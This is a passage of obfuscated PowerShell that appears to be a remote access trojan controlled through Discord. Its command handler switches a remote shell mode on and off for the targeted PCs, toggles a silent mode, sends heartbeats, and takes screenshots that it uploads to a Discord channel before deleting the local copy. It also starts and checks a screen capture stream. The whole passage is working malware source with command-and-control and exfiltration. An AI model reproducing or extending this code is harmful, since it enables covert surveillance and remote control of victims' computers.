                else { foreach ($JjMCP in ($BktMd.Trim() -split '\s+')) { if ($JjMCP) { [void]$script:shellTargets.Add($JjMCP) } } }
                if (Test-IsShellTarget) { $script:shellMode = $true; Send-DiscordMessage -Content "**$($script:pcName)** shell ON | targets: ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }
                else { $script:shellMode = $false }
                return
            }
            "shelloff" {
                $BpAXz = $true
                if ($BktMd) {
                    $BpAXz = $false
                    foreach ($JjMCP in ($BktMd.Trim() -split '\s+')) {
                        $D6qD = $JjMCP.ToLower()
                        if ($D6qD -eq 'all' -or $D6qD -eq '*' -or $D6qD -eq $script:pcName.ToLower() -or $D6qD -eq $script:hostname.ToLower()) { $BpAXz = $true; break }
                    }
                }
                if ($BpAXz) {
                    $script:shellMode = $false; $script:shellTargets.Clear()
                    Send-DiscordMessage -Content "**$($script:pcName)** shell OFF" -ReplyToId $msgId
                }
                return
            }
            "shells" { if ($script:shellMode) { Send-DiscordMessage -Content "**$($script:pcName)** in shell | ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }; return }
            "silent" { $bndCZBqZ = $BktMd.Trim().ToLower(); if ($bndCZBqZ -eq "off") { $script:silent = $false; Send-DiscordMessage -Content "loud" -ReplyToId $msgId } else { $script:silent = $true; Send-DiscordMessage -Content "silent" -ReplyToId $msgId }; return }
            "beat" { Send-Heartbeat; Send-DiscordMessage -Content "beat" -ReplyToId $msgId; return }

            "screenshot" { $path = Join-Path $env:TEMP "s_$(Get-Date -Format 'HHmmss').png"; if (Take-Screenshot -Path $path) { Send-DiscordFile -FilePath $path -Content "screenshot" -ReplyToId $msgId; Remove-Item $path -Force -EA SilentlyContinue } else { Send-DiscordMessage -Content "screenshot fail" -ReplyToId $msgId }; return }

            "capture" {
                $VvYns = ""
                if ($BktMd) { $VvYns = ($BktMd.Trim() -split '\s+')[0].ToLower() }

                if ($VvYns -eq "stop" -or $VvYns -eq "off") {
                    Send-DiscordMessage -Content (Stop-CaptureStream) -ReplyToId $msgId
                    return
                }
                if ($VvYns -eq "status") {
                    $ODAUqj = $null
                    if ($script:capturePid) { $ODAUqj = Get-Process -Id $script:capturePid -EA SilentlyContinue }
                    if (-not $ODAUqj -and (Test-Path -LiteralPath $script:capturePidFile)) {
                        try { $oWO9Tf = [int](Get-Content -LiteralPath $script:capturePidFile -Raw); $ODAUqj = Get-Process -Id $oWO9Tf -EA SilentlyContinue } catch { }
                    }
                    if ($ODAUqj) {
                        $OjA2q = if ($script:captureStart) { [int]((Get-Date) - $script:captureStart).TotalSeconds } else { "?" }
                        Send-DiscordMessage -Content "Running | PID $($ODAUqj.Id) | ${OjA2q}s elapsed" -ReplyToId $msgId
                    } else {
